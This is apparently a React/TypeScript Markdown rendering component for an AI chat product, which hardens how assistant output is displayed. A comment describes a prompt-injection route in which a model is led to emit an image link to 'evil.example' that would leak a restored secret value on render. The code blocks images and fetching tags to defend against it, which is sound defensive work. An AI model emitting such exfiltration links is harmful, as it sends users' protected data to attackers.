import type { ProtectionPreviewOrigin } from "@serovaai/ficta-protocol";
import { mermaid } from "@streamdown/mermaid";
import { memo, type ReactNode, useMemo } from "react";
import { defaultRehypePlugins, Streamdown, type StreamdownProps } from "streamdown";
import { lastDocumentBlock, lastHeading } from "@/lib/documents/document-blocks";
import {
  type ProtectionHighlightAnnotation,
  protectionHighlightTag,
  type RestoreHighlightDisplayMode,
  renderProtectionHighlights,
} from "@/lib/restore-highlights";
import { DocumentCard } from "./DocumentCard";
import { ProtectionMark, protectionHighlightPresentation } from "./ProtectionMark";

const RESTORE_ORIGINS = ["registry", "detected", "user"] as const;
const RESTORE_DIRECTIONS = ["redacted", "restored"] as const;
const RESTORE_TAGS = RESTORE_DIRECTIONS.flatMap((direction) =>
  RESTORE_ORIGINS.map((origin) => protectionHighlightTag(direction, origin)),
);
const RESTORE_ALLOWED_TAGS = Object.fromEntries(RESTORE_TAGS.map((tag) => [tag, []]));
const RESTORE_LITERAL_TAGS = RESTORE_TAGS;
// Module-level so the memoized component's props stay referentially stable across renders.
const STREAMDOWN_PLUGINS = { mermaid };

type RehypePlugins = NonNullable<StreamdownProps["rehypePlugins"]>;
type RehypePlugin = Extract<RehypePlugins[number], (...args: never[]) => unknown>;
type SanitizeSchema = { tagNames?: string[]; attributes?: Record<string, unknown[]> };

/**
 * Assistant text is model output, and the model reads attacker-controllable documents, so a prompt
 * injection can ask for `![x](https://evil.example/?c=FICTA_…)`. The proxy restores the real value
 * inside that URL, so a rendered remote image would send it to a third party with no click.
 * Streamdown's defaults allow every image and link prefix, so the chat replaces them:
 *
 * - no images: `allowedImagePrefixes: []` and `allowDataImages: false` block every `img` (the sanitize
 *   schema already drops `data:` sources); harden swaps it for an inline "image blocked" indicator;
 * - `picture`/`source` are dropped from the sanitize schema, because `source srcset` fetches on
 *   render and harden only rewrites `img src` and `a href`;
 * - links keep any http(s)/mailto target but no custom protocols, and stay behind Streamdown's
 *   link-safety confirmation (it shows the full URL before opening it).
 *
 * Passing `rehypePlugins` also turns off Streamdown's own `allowedTags` schema merge, so the restore
 * highlight tags are added to the sanitize schema here.
 */
// Reuse Streamdown's own raw/sanitize/harden plugins (no extra dependency); fail at load, never render
// unhardened, if a Streamdown upgrade renames or reshapes them.
const { raw: rehypeRaw, sanitize: sanitizeEntry, harden: hardenEntry } = defaultRehypePlugins;
if (!rehypeRaw || !Array.isArray(sanitizeEntry) || !Array.isArray(hardenEntry)) {
  throw new Error("streamdown defaultRehypePlugins changed shape; update the chat markdown hardening");
}
const RAW_PLUGIN: RehypePlugins[number] = rehypeRaw;
const [rehypeSanitize, DEFAULT_SANITIZE_SCHEMA] = sanitizeEntry as unknown as [RehypePlugin, SanitizeSchema];
const [rehypeHarden] = hardenEntry as unknown as [RehypePlugin, unknown];
const RENDER_FETCHING_TAGS = new Set(["picture", "source"]);
const HARDEN_OPTIONS = {
  allowedImagePrefixes: [],
  allowDataImages: false,
  allowedLinkPrefixes: ["*"],
  allowedProtocols: [],
};

function chatRehypePlugins(extraTags: Record<string, string[]>): RehypePlugins {
  const { picture: _picture, source: _source, ...attributes } = DEFAULT_SANITIZE_SCHEMA.attributes ?? {};
  const schema = {
    ...DEFAULT_SANITIZE_SCHEMA,
    tagNames: [
      ...(DEFAULT_SANITIZE_SCHEMA.tagNames ?? []).filter((tag) => !RENDER_FETCHING_TAGS.has(tag)),
      ...Object.keys(extraTags),
    ],
    attributes: { ...attributes, ...extraTags },
  };
  return [RAW_PLUGIN, [rehypeSanitize, schema], [rehypeHarden, HARDEN_OPTIONS]];
}

const REHYPE_PLUGINS = chatRehypePlugins({});
const RESTORE_REHYPE_PLUGINS = chatRehypePlugins(RESTORE_ALLOWED_TAGS);
const LINK_SAFETY = { enabled: true };

/**
 * The markdown seam, now in two layers. `Markdown` (exported) splits the text around the last
 * `ficta:document` fence so the contract renders inside a DocumentCard — typeset like prose, with
 * the drafting progress / Download header — instead of as a monospace code block; commentary before
 * and after the fence renders normally. Everything else is `MarkdownSegment`: Streamdown rendering
 * GFM that gracefully tolerates the unterminated blocks that appear mid-stream. Protection
 * annotations are span offsets on the whole text, so the split remaps them into each segment.
 */
const Markdown = memo(function Markdown({
  content,
  annotations,
  restoreDisplayMode = "values",
}: {
  content: string;
  annotations?: ProtectionHighlightAnnotation[];
  restoreDisplayMode?: RestoreHighlightDisplayMode;
}) {
  const block = useMemo(() => lastDocumentBlock(content), [content]);
  if (!block) {
    return <MarkdownSegment content={content} annotations={annotations} restoreDisplayMode={restoreDisplayMode} />;
  }

  const before = content.slice(0, block.start);
  const after = block.closed ? content.slice(block.end) : "";
  return (
    <>
      {before.trim() ? (
        <MarkdownSegment
          content={before}
          annotations={sliceAnnotations(annotations, 0, block.start)}
          restoreDisplayMode={restoreDisplayMode}
        />
      ) : null}
      <DocumentCard
        title={block.attrs.title?.trim() || undefined}
        closed={block.closed}
        progress={block.closed ? undefined : lastHeading(block.content)}
      >
        <MarkdownSegment
          content={block.content}
          annotations={sliceAnnotations(annotations, block.contentStart, block.contentEnd)}
          restoreDisplayMode={restoreDisplayMode}
        />
      </DocumentCard>
      {after.trim() ? (
        <MarkdownSegment
          content={after}
          annotations={sliceAnnotations(annotations, block.end, content.length)}
          restoreDisplayMode={restoreDisplayMode}
        />
      ) : null}
    </>
  );
});

export default Markdown;

/** Annotations inside [start, end), shifted to segment-relative offsets. A span that straddles a
 *  fence boundary cannot correspond to a real protected value, so it is dropped rather than split. */
function sliceAnnotations(
  annotations: ProtectionHighlightAnnotation[] | undefined,
  start: number,
  end: number,
): ProtectionHighlightAnnotation[] | undefined {
  if (!annotations?.length) return annotations;
  return annotations
    .filter((annotation) => annotation.start >= start && annotation.end <= end)
    .map((annotation) => ({ ...annotation, start: annotation.start - start, end: annotation.end - start }));
}

const MarkdownSegment = memo(function MarkdownSegment({
  content,
  annotations,
  restoreDisplayMode = "values",
}: {
  content: string;
  annotations?: ProtectionHighlightAnnotation[];
  restoreDisplayMode?: RestoreHighlightDisplayMode;
}) {
  const { html, highlighted } = useMemo(
    () => renderProtectionHighlights(content, annotations ?? [], restoreDisplayMode),
    [annotations, content, restoreDisplayMode],
  );
  const restoreComponents = useMemo(() => restoreHighlightComponents(restoreDisplayMode), [restoreDisplayMode]);
  return (
    <Streamdown
      allowedTags={highlighted ? RESTORE_ALLOWED_TAGS : undefined}
      className="max-w-none space-y-3 text-[0.95rem] leading-relaxed"
      components={highlighted ? restoreComponents : undefined}
      linkSafety={LINK_SAFETY}
      literalTagContent={highlighted ? RESTORE_LITERAL_TAGS : undefined}
      plugins={STREAMDOWN_PLUGINS}
      rehypePlugins={highlighted ? RESTORE_REHYPE_PLUGINS : REHYPE_PLUGINS}
    >
      {html}
    </Streamdown>
  );
});

function restoreHighlightComponents(displayMode: RestoreHighlightDisplayMode) {
  return Object.fromEntries(
    RESTORE_DIRECTIONS.flatMap((direction) =>
      RESTORE_ORIGINS.map((origin) => [
        protectionHighlightTag(direction, origin),
        ({ children }: { children?: ReactNode }) => (
          <ProtectionMark displayMode={displayMode} direction={direction} origin={origin}>
            {children}
          </ProtectionMark>
        ),
      ]),
    ),
  );
}

/** Mirrors ProtectionReview's three-way key for restored assistant values. */
export function restoreHighlightPresentation(origin: ProtectionPreviewOrigin): {
  tooltipLabel: string;
  borderClass: string;
} {
  const { tooltipLabel, borderClass } = protectionHighlightPresentation(origin, "restored");
  return { tooltipLabel, borderClass };
}
